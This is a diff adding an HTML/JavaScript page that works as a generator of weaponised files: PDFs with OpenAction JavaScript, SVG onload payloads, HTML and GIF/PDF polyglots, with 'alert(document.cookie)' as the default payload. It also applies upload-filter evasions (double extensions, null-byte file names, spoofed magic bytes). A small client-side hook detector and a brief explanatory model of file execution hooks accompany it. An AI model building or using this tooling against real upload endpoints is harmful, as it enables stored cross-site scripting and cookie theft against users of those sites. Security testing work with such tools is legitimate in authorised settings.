@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>File Format Execution Hook Engine</title>
+  <style>
+    body { font-family: 'Segoe UI', Roboto, sans-serif; background: #f5f7fa; margin: 2rem; }
+    .container { max-width: 1100px; margin: 0 auto; background: white; padding: 2rem; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
+    h1, h2, h3 { color: #1e293b; }
+    .row { display: flex; flex-wrap: wrap; gap: 2rem; }
+    .col { flex: 1 1 300px; }
+    label { font-weight: 600; display: block; margin-top: 1rem; }
+    select, textarea, input[type="text"], input[type="file"] { width: 100%; padding: 0.6rem; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 0.95rem; }
+    textarea { min-height: 80px; font-family: monospace; }
+    .btn { background: #3b82f6; color: white; border: none; padding: 0.6rem 1.5rem; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 1rem; }
+    .btn:hover { background: #2563eb; }
+    .btn-secondary { background: #64748b; }
+    .btn-secondary:hover { background: #475569; }
+    .result-box { background: #f1f5f9; padding: 1rem; border-radius: 8px; margin-top: 1.5rem; white-space: pre-wrap; font-size: 0.9rem; }
+    table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+    th, td { border: 1px solid #e2e8f0; padding: 0.5rem; text-align: left; }
+    th { background: #eef2f6; }
+    .badge { background: #e11d48; color: white; padding: 0.2rem 0.6rem; border-radius: 20px; font-size: 0.75rem; }
+    .file-list { display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 0.5rem 0; }
+    .file-item { background: #eef2f6; padding: 0.2rem 0.8rem; border-radius: 16px; }
+    .inline-block { display: inline-block; margin-right: 1rem; }
+    hr { margin: 2rem 0; border: 0; border-top: 2px dashed #d1d5db; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <h1>📄 File Format Execution Hook Engine</h1>
+  <p style="color: #475569;">Generate test files with embedded payloads and evasion techniques. Understand the three‑question model: <strong>spec hook → renderer honour → sink context</strong>.</p>
+
+  <!-- GENERATOR -->
+  <div class="row">
+    <div class="col">
+      <h3>🔧 Generate File</h3>
+      <form id="genForm">
+        <label for="format">Format</label>
+        <select id="format" name="format">
+          <option value="pdf">PDF (JavaScript)</option>
+          <option value="svg">SVG (onload/script)</option>
+          <option value="html">HTML (script)</option>
+          <option value="polyglot-gif-html">Polyglot GIF/HTML</option>
+          <option value="polyglot-pdf-html">Polyglot PDF/HTML</option>
+        </select>
+
+        <label for="payload">Payload (JavaScript / VBA)</label>
+        <textarea id="payload" name="payload">alert(document.cookie)</textarea>
+
+        <label for="sink">Sink (serving method)</label>
+        <select id="sink" name="sink">
+          <option value="inline">Inline (browser renders)</option>
+          <option value="attachment">Attachment (forces download)</option>
+        </select>
+
+        <label>Evasion Techniques</label>
+        <div style="margin: 0.5rem 0;">
+          <label style="font-weight:normal; display:inline-block; margin-right:1rem;">
+            <input type="checkbox" id="doubleExt" value="1"> Double extension
+          </label>
+          <label style="font-weight:normal; display:inline-block; margin-right:1rem;">
+            <input type="checkbox" id="nullByte" value="1"> Null byte (%00)
+          </label>
+          <label style="font-weight:normal; display:inline-block;">
+            <input type="checkbox" id="magicBytes" value="1"> Spoof magic bytes
+          </label>
+        </div>
+
+        <label for="magicType">Magic type (if spoofing)</label>
+        <select id="magicType" disabled>
+          <option value="gif">GIF89a</option>
+          <option value="png">PNG</option>
+          <option value="jpg">JPEG</option>
+        </select>
+
+        <button type="submit" class="btn">Generate &amp; Download</button>
+      </form>
+    </div>
+
+    <div class="col">
+      <h3>📤 Upload &amp; Analyze</h3>
+      <p>Upload a file to detect execution hooks (client‑side scan).</p>
+      <form id="analyzeForm" enctype="multipart/form-data">
+        <input type="file" id="analyzeFile" name="file" accept=".pdf,.svg,.html,.docx,.docm">
+        <button type="submit" class="btn btn-secondary">Analyze</button>
+      </form>
+      <div id="analysisResult" class="result-box" style="display:none;"></div>
+    </div>
+  </div>
+
+  <hr>
+
+  <!-- QUICK REFERENCE -->
+  <div style="background: #f8fafc; padding: 1rem; border-radius: 8px;">
+    <h3>🧠 Mental Model</h3>
+    <ul>
+      <li><strong>Spec hook</strong> – The format defines a place to execute code (e.g., PDF /OpenAction, SVG onload).</li>
+      <li><strong>Renderer honour</strong> – Does the actual viewer/reader execute that hook? (Chrome PDF viewer ignores Acrobat JS, but PDF.js may be vulnerable).</li>
+      <li><strong>Sink context</strong> – How is the file served? <code>&lt;img&gt;</code> strips scripts, <code>&lt;object&gt;</code> and <code>&lt;iframe&gt;</code> keep them.</li>
+    </ul>
+  </div>
+
+  <hr>
+
+  <!-- GENERATED FILES (hidden, used for download) -->
+  <div id="fileOutput" style="display:none;"></div>
+
+</div>
+
+<script>
+  (function() {
+    // ---------- HELPER: Build raw PDF with JavaScript (dynamically computed offsets) ----------
+    function buildPDF(payload) {
+      // Escape parentheses and backslashes for PDF string
+      const escaped = payload.replace(/\\/g, '\\\\').replace(/\(/g, '\\(').replace(/\)/g, '\\)');
+
+      // Build each object as a string
+      const obj1 = `1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
+endobj`;
+
+      const obj2 = `2 0 obj
+<< /Type /Pages /Kids [4 0 R] /Count 1 >>
+endobj`;
+
+      const obj4 = `4 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
+endobj`;
+
+      const obj5 = `5 0 obj
+<< /Length 0 >>
+stream
+endstream
+endobj`;
+
+      const obj3 = `3 0 obj
+<< /Type /Action /S /JavaScript /JS (${escaped}) >>
+endobj`;
+
+      // Concatenate objects with newline separators (and a final newline)
+      const objects = obj1 + '\n' + obj2 + '\n' + obj4 + '\n' + obj5 + '\n' + obj3 + '\n';
+
+      // Compute byte offsets for each object (0‑based index) using regex
+      const objPositions = [];
+      const pattern = /^(\d+) \d+ obj/gm;
+      let match;
+      while ((match = pattern.exec(objects)) !== null) {
+        objPositions.push(match.index);
+      }
+      // objPositions[0] => object 1, [1] => object 2, [2] => object 4, [3] => object 5, [4] => object 3
+      // Note: object numbers are not sequential in order, but we have 5 objects.
+      // We'll build xref entries for objects 0‑5.
+      // Object 0 is free, then 1,2,3,4,5.
+      // We need to match object numbers to positions.
+      // Since we have exactly 5 objects, we can just map by order: 1->pos0, 2->pos1, 3->pos4, 4->pos2, 5->pos3.
+      // But easier: we can parse the object numbers from the objects string and match.
+      // We'll do a simple mapping by iterating over objects and extracting the number.
+      const objNumToPos = {};
+      const numPattern = /^(\d+) \d+ obj/gm;
+      let numMatch;
+      while ((numMatch = numPattern.exec(objects)) !== null) {
+        const num = parseInt(numMatch[1], 10);
+        objNumToPos[num] = numMatch.index;
+      }
+      // Now build xref entries: for each number from 0 to 5.
+      const maxObj = Math.max(...Object.keys(objNumToPos).map(Number));
+      const xrefEntries = [];
+      // Entry for object 0 (free)
+      xrefEntries.push('0000000000 65535 f ');
+      for (let i = 1; i <= maxObj; i++) {
+        if (objNumToPos.hasOwnProperty(i)) {
+          const offset = objNumToPos[i];
+          const entry = String(offset).padStart(10, '0') + ' 00000 n ';
+          xrefEntries.push(entry);
+        } else {
+          // Should not happen, but fallback
+          xrefEntries.push('0000000000 00000 n ');
+        }
+      }
+      const xref = 'xref\n' + '0 ' + xrefEntries.length + '\n' + xrefEntries.join('\n') + '\n';
+      const trailer = 'trailer\n<< /Size ' + xrefEntries.length + ' /Root 1 0 R >>\n';
+      const startxref = objects.length;
+      const pdf = objects + xref + trailer + 'startxref\n' + startxref + '\n%%EOF';
+      return pdf;
+    }
+
+    // ---------- FORMAT GENERATORS ----------
+    function generateFile(format, payload, magicType) {
+      let content = '';
+      let mime = 'application/octet-stream';
+      let ext = 'bin';
+
+      switch(format) {
+        case 'pdf': {
+          content = buildPDF(payload);
+          mime = 'application/pdf';
+          ext = 'pdf';
+          break;
+        }
+        case 'svg': {
+          // Use onload event
+          content = `<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" onload="${payload.replace(/"/g, '&quot;')}">
+  <rect width="200" height="200" fill="red" />
+</svg>`;
+          mime = 'image/svg+xml';
+          ext = 'svg';
+          break;
+        }
+        case 'html': {
+          content = `<!DOCTYPE html>
+<html><head><title>Hook Test</title></head>
+<body><script>${payload}</script></body></html>`;
+          mime = 'text/html';
+          ext = 'html';
+          break;
+        }
+        case 'polyglot-gif-html': {
+          // GIF89a header then HTML comment + script
+          const gifHeader = 'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b';
+          const htmlPart = `<!--
+<script>${payload}</script>
+-->`;
+          content = gifHeader + htmlPart;
+          mime = 'image/gif';
+          ext = 'gif';
+          break;
+        }
+        case 'polyglot-pdf-html': {
+          // Generate a valid PDF then append HTML after %%EOF
+          const pdfPart = buildPDF(payload);
+          const htmlAppend = `\n<!--\n<script>${payload}</script>\n-->`;
+          content = pdfPart + htmlAppend;
+          mime = 'application/pdf';
+          ext = 'pdf.html'; // will be used as base extension
+          break;
+        }
+        default:
+          content = 'Unsupported format';
+      }
+
+      // Apply magic byte spoofing if enabled
+      if (magicType && magicType !== 'none') {
+        let magic = '';
+        switch(magicType) {
+          case 'gif': magic = 'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'; break;
+          case 'png': magic = '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde'; break;
+          case 'jpg': magic = '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'; break;
+          default: magic = '';
+        }
+        content = magic + content;
+      }
+
+      return { content, mime, ext };
+    }
+
+    // ---------- FILENAME BUILDING WITH EVASIONS ----------
+    function buildFilename(baseName, format, doubleExt, nullByte, ext) {
+      let name = baseName || 'payload';
+      name = name.replace(/[^a-zA-Z0-9_\-]/g, '_');
+      let finalExt = ext;
+
+      if (doubleExt) {
+        // Insert a fake extension before the real one
+        if (!finalExt.includes('.')) {
+          finalExt = 'jpg.' + finalExt; // e.g., payload.jpg.pdf
+        } else {
+          // Already has a dot (like 'pdf.html'), insert after first part
+          const parts = finalExt.split('.');
+          parts.splice(1, 0, 'jpg');
+          finalExt = parts.join('.');
+        }
+      }
+
+      // Null byte will be inserted in the download function
+      return { filename: name + '.' + finalExt, finalExt };
+    }
+
+    // ---------- DOWNLOAD FUNCTION ----------
+    function downloadFile(content, mime, filename, nullByte) {
+      const blob = new Blob([content], { type: mime });
+      let finalName = filename;
+      if (nullByte) {
+        // Insert a null byte before the last extension (if any)
+        const lastDot = finalName.lastIndexOf('.');
+        if (lastDot !== -1) {
+          const before = finalName.substring(0, lastDot);
+          const after = finalName.substring(lastDot);
+          finalName = before + String.fromCharCode(0) + after;
+        } else {
+          // No extension, append null byte and .bin
+          finalName = finalName + String.fromCharCode(0) + '.bin';
+        }
+        // Create a File with the name containing the null byte
+        const file = new File([blob], finalName, { type: mime });
+        const url = URL.createObjectURL(file);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = finalName;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+      } else {
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = finalName;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+      }
+    }
+
+    // ---------- ANALYSIS ----------
+    function analyzeFile(fileBytes, filename) {
+      const ext = filename.split('.').pop().toLowerCase();
+      let hooks = [];
+      const text = new TextDecoder('utf-8').decode(fileBytes);
+
+      if (ext === 'pdf') {
+        if (text.includes('/JavaScript') || text.includes('/OpenAction') || text.includes('/AA')) {
+          hooks.push('PDF JavaScript action (OpenAction, /JavaScript, /AA)');
+        }
+        if (text.includes('/JS') && text.includes('/S /JavaScript')) {
+          hooks.push('PDF /JavaScript action');
+        }
+      } else if (ext === 'svg' || text.includes('<svg')) {
+        if (text.includes('onload=')) hooks.push('SVG onload event');
+        if (text.includes('<script')) hooks.push('SVG <script> element');
+      } else if (ext === 'html' || text.includes('<html') || text.includes('<!DOCTYPE html')) {
+        if (text.includes('<script')) hooks.push('HTML <script>');
+        if (text.includes('onload=')) hooks.push('HTML onload event');
+      } else {
+        // Generic: look for script tags, onload, etc.
+        if (text.includes('<script')) hooks.push('Script tag detected');
+        if (text.includes('onload=')) hooks.push('onload event');
+      }
+
+      return hooks;
+    }
+
+    // ---------- EVENT HANDLERS ----------
+    document.getElementById('genForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const format = document.getElementById('format').value;
+      const payload = document.getElementById('payload').value || 'alert("XSS")';
+      const sink = document.getElementById('sink').value; // currently not used for download but kept for demonstration
+      const doubleExt = document.getElementById('doubleExt').checked;
+      const nullByte = document.getElementById('nullByte').checked;
+      const magicBytes = document.getElementById('magicBytes').checked;
+      const magicType = document.getElementById('magicType').value;
+
+      const { content, mime, ext } = generateFile(format, payload, magicBytes ? magicType : null);
+
+      const baseName = 'payload';
+      let { filename, finalExt } = buildFilename(baseName, format, doubleExt, nullByte, ext);
+
+      downloadFile(content, mime, filename, nullByte);
+
+      const outputDiv = document.getElementById('fileOutput');
+      outputDiv.style.display = 'block';
+      outputDiv.innerHTML = `<strong>Generated:</strong> ${filename} (${mime})<br>Payload: ${payload}`;
+    });
+
+    document.getElementById('magicBytes').addEventListener('change', function() {
+      document.getElementById('magicType').disabled = !this.checked;
+    });
+
+    document.getElementById('analyzeForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const fileInput = document.getElementById('analyzeFile');
+      if (!fileInput.files.length) {
+        alert('Please select a file');
+        return;
+      }
+      const file = fileInput.files[0];
+      const reader = new FileReader();
+      reader.onload = function(ev) {
+        const data = ev.target.result;
+        const bytes = new Uint8Array(data);
+        const hooks = analyzeFile(bytes, file.name);
+        const resultDiv = document.getElementById('analysisResult');
+        resultDiv.style.display = 'block';
+        if (hooks.length === 0) {
+          resultDiv.innerHTML = `<strong>${file.name}</strong> – No obvious execution hooks detected.`;
+        } else {
+          resultDiv.innerHTML = `<strong>${file.name}</strong> – Detected hooks:\n${hooks.map(h => '• ' + h).join('\n')}`;
+        }
+      };
+      reader.readAsArrayBuffer(file);
+    });
+
+    // Initial state: magic type disabled
+    document.getElementById('magicType').disabled = true;
+  })();
+</script>
+
+</body>
+</html>
